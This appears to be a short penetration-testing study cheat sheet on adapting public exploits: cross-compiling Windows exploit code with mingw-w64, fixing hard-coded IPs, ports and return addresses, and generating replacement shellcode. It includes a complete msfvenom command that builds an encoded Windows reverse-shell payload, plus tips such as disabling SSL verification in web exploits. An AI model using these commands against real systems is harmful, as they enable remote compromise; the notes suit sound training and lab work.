searchsploit -m numberofexploit

LOOK FOR HEADERS THAT INDICATE TO BE COMPILED ON WINDOWS, FOR THESE YOU CAN USE 
MINGW-W64
TO CROSS COMPILE, I.E.

i686-w64-mingw32-gcc exploit.c -o windersexployt.exe

GOOGLE ANY ERRORS, I.E. FOR WSA STARTUP UNDEFINED REFERENCE ERROR YOU CAN USE THE -lws2_32 FLAG, I.E.

i686-w64-mingw32-gcc exploit.c -o windersexployt.exe -lws2_32

ALWAYS CHECK EXPLOITS FOR HARD-CODED VALUES, I.E. IP ADDRESS AND PORT NUMBER<<<<<<<<

CHECK RETURN ADDRESSES AND CORRECT IF NEEDED<<<<<<<<<<<<<<<<<

ALWAYS CHECK AND REPLACE THE SHELLCODE, I.E. <<<<<<<<<<<<

msfvenom -p windows/shell_reverse_tcp LHOST=YOUR.IP.HERE LPORT=PORTOFLISTENERHERE EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
-p PLATFORM/CONNECTION TYPE
LHOST=your ip
LPORT=port nc is listening on
EXITFUNC=what to do when targeted service exits
-f OUTPUT FORMAT
-e ENCODING MECHANISM
-b BAD CHARACTERS

YOU CAN RUN CROSS COMPILED EXPLOITS IN WINE<<<<<<<<<<<

IF YOU HAVE AN ISSUE, SUCH AS, THE BUFFER BEING AN INCORRECT SIZE, CHECK FOR CLUES WITHIN THE EXPLOT THAT REFERENCE SUCH


>FIXING WEB EXPLOITS:<<<

REMEMBER THAT PYTHON CAN USE verify=FALSE TO IGNORE SSL CERTS<<<
ALWAYS CHECK FOR HARDCODED VARIABLES THAT YOU NEED TO CORRECT TO MATCH THE TARGET MACHINE<<<

CHECK FOR SPLIT METHODS AND CORRECT, OR JUST IN GENERAL READ, AND RESEARCH ANY ERRORS
